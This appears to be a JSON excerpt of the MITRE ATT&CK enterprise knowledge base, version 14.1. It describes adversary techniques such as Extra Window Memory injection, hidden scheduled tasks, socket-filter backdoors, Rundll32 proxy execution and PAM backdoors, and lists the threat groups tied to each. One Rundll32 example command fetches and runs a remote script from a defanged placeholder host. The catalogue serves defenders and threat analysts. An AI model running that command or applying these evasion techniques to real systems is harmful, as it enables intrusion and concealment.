{"domain":"enterprise","version":"14.1","techniques":{"T1055.011":{"id":"T1055.011","name":"Extra Window Memory Injection","description":"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).^[[1]](https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx)^ Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. ^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx)^ ^[[3]](https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx)^\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as `WriteProcessMemory` and `CreateRemoteThread`.^[[4]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^ More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  ^[[5]](https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html)^ ^[[6]](https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/)^\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ","platforms":["Windows"],"tactics":["Defense Evasion","Privilege Escalation"],"campaigns":[],"groups":[]},"T1053.005":{"id":"T1053.005","name":"Scheduled Task","description":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At](https://attack.mitre.org/techniques/T1053/002)), though `at.exe` can not access tasks created with `schtasks` or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.^[[1]](https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain)^\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).^[[2]](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml)^^[[3]](https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/)^ Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.^[[4]](https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments)^ ","platforms":["Windows"],"tactics":["Execution","Persistence","Privilege Escalation"],"campaigns":["SolarWinds Compromise","C0017","Frankenstein","CostaRicto","Operation Dream Job","Operation CuckooBees","Operation Wocao"],"groups":["APT3","Cobalt Group","Silence","Chimera","Patchwork","FIN7","TA2541","GALLIUM","HEXANE","Mustang Panda","Magic Hound","FIN13","Blue Mockingbird","Molerats","APT29","APT39","FIN8","Wizard Spider","Higaisa","APT41","Rancor","Machete","FIN10","Naikon","APT32","Fox Kitten","APT33","OilRig","APT38","TEMP.Veles","menuPass","APT-C-36","FIN6","LuminousMoth","Lazarus Group","BRONZE BUTLER","Dragonfly","MuddyWater","Gamaredon Group","Kimsuky","Stealth Falcon","BITTER","Confucius","APT37","UNC2452","Operation Wocao","Frankenstein","CostaRicto","Dragonfly 2.0"]},"T1205.002":{"id":"T1205.002","name":"Socket Filters","description":"Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.^[[1]](http://recursos.aldabaknocking.com/libpcapHakin9LuisMartinGarcia.pdf)^ Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).^[[2]](https://exatrack.com/public/Tricephalic_Hellkeeper.pdf)^^[[3]](https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf)^\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.","platforms":["Linux","macOS","Windows"],"tactics":["Defense Evasion","Persistence","Command and Control"],"campaigns":[],"groups":[]},"T1560.001":{"id":"T1560.001","name":"Archive via Utility","description":"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems. \n\nOn Windows, `diantz` or ` makecab` may be used to package collected files into a cabinet (.cab) file. `diantz` may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).^[[1]](https://lolbas-project.github.io/lolbas/Binaries/Diantz/)^ `xcopy` on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. \n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.^[[2]](https://www.7-zip.org/)^^[[3]](https://www.rarlab.com/)^^[[4]](https://www.winzip.com/win/en/)^","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":["Operation CuckooBees","Operation Wocao","FunnyDream","C0026","Operation Honeybee","SolarWinds Compromise","Operation Dream Job"],"groups":["HAFNIUM","menuPass","Wizard Spider","APT33","Fox Kitten","CopyKittens","Volt Typhoon","APT1","Mustang Panda","Chimera","Gallmaker","APT39","GALLIUM","APT41","MuddyWater","APT28","Turla","Sowbug","BRONZE BUTLER","Kimsuky","APT3","FIN8","Ke3chang","FIN13","Earth Lusca","Magic Hound","Aquatic Panda","UNC2452","APT29","Operation Wocao"]},"T1021.005":{"id":"T1021.005","name":"VNC","description":"Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (“remote framebuffer”) protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.^[[1]](https://datatracker.ietf.org/doc/html/rfc6143#section-7.2.2)^\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.^[[2]](https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac)^^[[3]](https://help.realvnc.com/hc/en-us/articles/360002250097-Setting-up-System-Authentication)^\n\nAdversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.^[[4]](https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc)^^[[5]](https://www.tenable.com/blog/detecting-macos-high-sierra-root-account-without-authentication)^^[[6]](https://www.bleepingcomputer.com/news/security/dozens-of-vnc-vulnerabilities-found-in-linux-windows-solutions/)^^[[7]](https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/)^^[[8]](https://pentestlab.blog/2012/10/30/attacking-vnc-servers/)^^[[9]](http://lists.openstack.org/pipermail/openstack/2013-December/004138.html)^","platforms":["Linux","macOS","Windows"],"tactics":["Lateral Movement"],"campaigns":[],"groups":["Gamaredon Group","FIN7","GCMAN","Fox Kitten"]},"T1047":{"id":"T1047","name":"Windows Management Instrumentation","description":"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM).^[[1]](https://msdn.microsoft.com/en-us/library/aa394582.aspx)^ Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.^[[1]](https://msdn.microsoft.com/en-us/library/aa394582.aspx)^^[[2]](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)^\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. ^[[3]](https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf)^ ^[[2]](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf)^","platforms":["Windows"],"tactics":["Execution"],"campaigns":["C0015","Frankenstein","C0027","Operation Dream Job","2016 Ukraine Electric Power Attack","Operation Wocao","SolarWinds Compromise","FunnyDream","C0018"],"groups":["menuPass","Gamaredon Group","APT32","Mustang Panda","MuddyWater","Wizard Spider","Leviathan","FIN7","GALLIUM","Volt Typhoon","Blue Mockingbird","Naikon","Lazarus Group","Sandworm Team","Earth Lusca","Indrik Spider","TA2541","Stealth Falcon","APT29","OilRig","Windshift","FIN6","Deep Panda","Threat Group-3390","Chimera","FIN13","Magic Hound","APT41","FIN8","UNC2452","Frankenstein","Operation Wocao","APT34"]},"T1113":{"id":"T1113","name":"Screen Capture","description":"Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as `CopyFromScreen`, `xwd`, or `screencapture`.^[[1]](https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen?view=netframework-4.8)^^[[2]](https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/)^\n","platforms":["Linux","macOS","Windows"],"tactics":["Collection"],"campaigns":[],"groups":["Dragonfly","BRONZE BUTLER","Gamaredon Group","OilRig","APT28","MoustachedBouncer","GOLD SOUTHFIELD","Magic Hound","MuddyWater","Silence","Group5","APT39","Dark Caracal","FIN7","Dragonfly 2.0","APT34"]},"T1027.011":{"id":"T1027.011","name":"Fileless Storage","description":"Adversaries may store data in \"fileless\" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage include the Windows Registry, event logs, or WMI repository.^[[1]](https://learn.microsoft.com/microsoft-365/security/intelligence/fileless-threats)^^[[2]](https://securelist.com/a-new-secret-stash-for-fileless-malware/106393/)^\n\nSimilar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage.\n\nAdversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.\n\nSome forms of fileless storage activity may indirectly create artifacts in the file system, but in central and otherwise difficult to inspect formats such as the WMI (e.g., `%SystemRoot%\\System32\\Wbem\\Repository`) or Registry (e.g., `%SystemRoot%\\System32\\Config`) physical files.^[[1]](https://learn.microsoft.com/microsoft-365/security/intelligence/fileless-threats)^ ","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation CuckooBees"],"groups":["APT32","Turla"]},"T1037":{"id":"T1037","name":"Boot or Logon Initialization Scripts","description":"Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence. Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.","platforms":["macOS","Windows","Linux"],"tactics":["Persistence","Privilege Escalation"],"campaigns":[],"groups":["APT29","Rocke"]},"T1557":{"id":"T1557","name":"Adversary-in-the-Middle","description":"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.^[[1]](https://www.rapid7.com/fundamentals/man-in-the-middle-attacks/)^\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.^[[2]](https://blog.netlab.360.com/ttint-an-iot-remote-control-trojan-spread-through-2-0-day-vulnerabilities/)^^[[3]](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/web-attack/125/how-dns-changer-trojans-direct-users-to-threats)^^[[4]](https://securelist.com/ad-blocker-with-miner-included/101105/)^ Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials and session cookies.^[[5]](https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/)^ [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.^[[6]](https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/)^^[[7]](https://arxiv.org/abs/1809.05681)^^[[8]](https://tlseminar.github.io/downgrade-attacks/)^\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).","platforms":["Windows","macOS","Linux","Network"],"tactics":["Credential Access","Collection"],"campaigns":[],"groups":["Kimsuky"]},"T1033":{"id":"T1033","name":"System Owner/User Discovery","description":"Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from [System Owner/User Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including `whoami`. In macOS and Linux, the currently logged in user can be identified with `w` and `who`. On macOS the `dscl . list /Users | grep -v '_'` command can also be used to enumerate user accounts. Environment variables, such as `%USERNAME%` and `$USER`, may also be used to access this information.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show users` and `show ssh` can be used to display users currently logged into the device.^[[1]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/security/s1/sec-s1-cr-book/sec-cr-s5.html)^^[[2]](https://us-cert.cisa.gov/ncas/alerts/TA18-106A)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Discovery"],"campaigns":["C0017","Operation Wocao","Night Dragon","C0018","Operation CuckooBees","Frankenstein"],"groups":["APT38","FIN8","Ke3chang","FIN7","HAFNIUM","APT19","FIN10","APT32","APT39","APT37","Lazarus Group","Tropic Trooper","Threat Group-3390","Earth Lusca","Magic Hound","ZIRCONIUM","Chimera","Patchwork","Stealth Falcon","Volt Typhoon","LuminousMoth","Gamaredon Group","GALLIUM","Wizard Spider","APT41","OilRig","HEXANE","Windshift","MuddyWater","Dragonfly","Sandworm Team","Sidewinder","APT3","Frankenstein","Operation Wocao","Dragonfly 2.0","APT28"]},"T1583":{"id":"T1583","name":"Acquire Infrastructure","description":"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.^[[1]](https://documents.trendmicro.com/assets/wp/wp-criminal-hideouts-for-lease.pdf)^ Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.^[[2]](https://www.amnesty.org/en/latest/research/2021/07/forensic-methodology-report-how-to-catch-nso-groups-pegasus/)^^[[3]](https://www.ic3.gov/Media/News/2022/220818.pdf)^^[[4]](https://www.mandiant.com/resources/blog/apt29-continues-targeting-microsoft)^ Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1218.011":{"id":"T1218.011","name":"Rundll32","description":"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: `rundll32.exe {DLLname, DLLfunction}`).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions `Control_RunDLL` and `Control_RunDLLAsUser`. Double-clicking a .cpl file also causes rundll32.exe to execute. ^[[1]](https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf)^\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: `rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"`  This behavior has been seen used by malware such as Poweliks. ^[[2]](https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/)^\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command `rundll32.exe ExampleDLL.dll, ExampleFunction`, rundll32.exe would first attempt to execute `ExampleFunctionW`, or failing that `ExampleFunctionA`, before loading `ExampleFunction`). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending `W` and/or `A` to harmless ones.^[[3]](https://www.attackify.com/blog/rundll32_execution_order/)^^[[4]](https://github.com/gtworek/PSBits/tree/master/NoRunDll)^ DLL functions can also be exported and executed by an ordinal number (ex: `rundll32.exe file.dll,#1`).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.^[[5]](https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/)^ ","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":["Operation Dream Job","C0021","C0015","SolarWinds Compromise","2015 Ukraine Electric Power Attack","Operation Spalax","C0018"],"groups":["Gamaredon Group","FIN7","APT19","Kimsuky","Carbanak","APT3","Magic Hound","TA551","Blue Mockingbird","Wizard Spider","APT32","Lazarus Group","TA505","CopyKittens","APT41","Sandworm Team","APT28","HAFNIUM","APT38","LazyScripter","MuddyWater","UNC2452","APT29"]},"T1613":{"id":"T1613","name":"Container and Resource Discovery","description":"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.\n\nThese resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.^[[1]](https://docs.docker.com/engine/api/v1.41/)^^[[2]](https://kubernetes.io/docs/concepts/overview/kubernetes-api/)^ In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ","platforms":["Containers"],"tactics":["Discovery"],"campaigns":[],"groups":["TeamTNT"]},"T1583.007":{"id":"T1583.007","name":"Serverless","description":"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.\n\nOnce acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.^[[1]](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/)^^[[2]](https://blog.xpnsec.com/aws-lambda-redirector/)^ As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.^[[3]](https://awakesecurity.com/blog/threat-hunting-series-detecting-command-control-in-the-cloud/)^^[[1]](https://www.bleepingcomputer.com/news/security/blackwater-malware-abuses-cloudflare-workers-for-c2-communication/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":[]},"T1132.001":{"id":"T1132.001","name":"Standard Encoding","description":"Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.^[[1]](https://en.wikipedia.org/wiki/Binary-to-text_encoding)^^[[2]](https://en.wikipedia.org/wiki/Character_encoding)^ Some data encoding systems may also result in data compression, such as gzip.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["Sandworm Team","Patchwork","BRONZE BUTLER","TA551","Lazarus Group","Tropic Trooper","MuddyWater","APT19","APT33","HAFNIUM"]},"T1027.009":{"id":"T1027.009","name":"Embedded Payloads","description":"Adversaries may embed payloads within other files to conceal malicious content from defenses. Otherwise seemingly benign files (such as scripts and executables) may be abused to carry and obfuscate malicious payloads and content. In some cases, embedded payloads may also enable adversaries to [Subvert Trust Controls](https://attack.mitre.org/techniques/T1553) by not impacting execution controls such as digital signatures and notarization tickets.^[[1]](https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)^ \n\nAdversaries may embed payloads in various file formats to hide payloads.^[[2]](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/c41e062d-f764-4f13-bd4f-ea812ab9a4d1)^ This is similar to [Steganography](https://attack.mitre.org/techniques/T1027/003), though does not involve weaving malicious content into specific bytes and patterns related to legitimate digital media formats.^[[3]](https://github.com/peewpw/Invoke-PSImage)^ \n\nFor example, adversaries have been observed embedding payloads within or as an overlay of an otherwise benign binary.^[[4]](https://securelist.com/my-name-is-dtrack/93338/)^ Adversaries have also been observed nesting payloads (such as executables and run-only scripts) inside a file of the same format.^[[5]](https://www.sentinelone.com/labs/fade-dead-adventures-in-reversing-malicious-run-only-applescripts/)^ \n\nEmbedded content may also be used as [Process Injection](https://attack.mitre.org/techniques/T1055) payloads used to infect benign system processes.^[[6]](https://www.trendmicro.com/en_us/research/20/e/netwalker-fileless-ransomware-injected-via-reflective-loading.html)^ These embedded then injected payloads may be used as part of the modules of malware designed to provide specific features such as encrypting C2 communications in support of an orchestrator module. For example, an embedded module may be injected into default browsers, allowing adversaries to then communicate via the network.^[[7]](https://www.cisa.gov/uscert/ncas/analysis-reports/ar20-303a)^","platforms":["macOS","Windows","Linux"],"tactics":["Defense Evasion"],"campaigns":["C0021"],"groups":[]},"T1556.003":{"id":"T1556.003","name":"Pluggable Authentication Modules","description":"Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is `pam_unix.so`, which retrieves, sets, and verifies account authentication information in `/etc/passwd` and `/etc/shadow`.^[[1]](https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt)^^[[2]](https://linux.die.net/man/8/pam_unix)^^[[3]](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/managing_smart_cards/pluggable_authentication_modules)^\n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as `pam_unix.so`, can be patched to accept arbitrary adversary supplied values as legitimate credentials.^[[4]](https://github.com/zephrax/linux-pam-backdoor)^\n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.^[[5]](https://x-c3ll.github.io/posts/PAM-backdoor-DNS/)^^[[1]](https://opensource.apple.com/source/dovecot/dovecot-239/dovecot/doc/wiki/PasswordDatabase.PAM.txt)^","platforms":["Linux","macOS"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1578.004":{"id":"T1578.004","name":"Revert Cloud Instance","description":"An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\n\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.^[[1]](https://www.techrepublic.com/blog/the-enterprise-cloud/backing-up-and-restoring-snapshots-on-amazon-ec2-machines/)^^[[2]](https://cloud.google.com/compute/docs/disks/restore-and-delete-snapshots)^","platforms":["IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1592":{"id":"T1592","name":"Gather Victim Host Information","description":"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.^[[1]](https://cybersecurity.att.com/blogs/labs-research/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks)^ Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":[],"groups":[]},"T1596.003":{"id":"T1596.003","name":"Digital Certificates","description":"Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.^[[1]](https://www.sslshopper.com/ssl-checker.html)^ Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).^[[2]](https://medium.com/@menakajain/export-download-ssl-certificate-from-server-site-url-bcfc41ea46a2)^ Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active 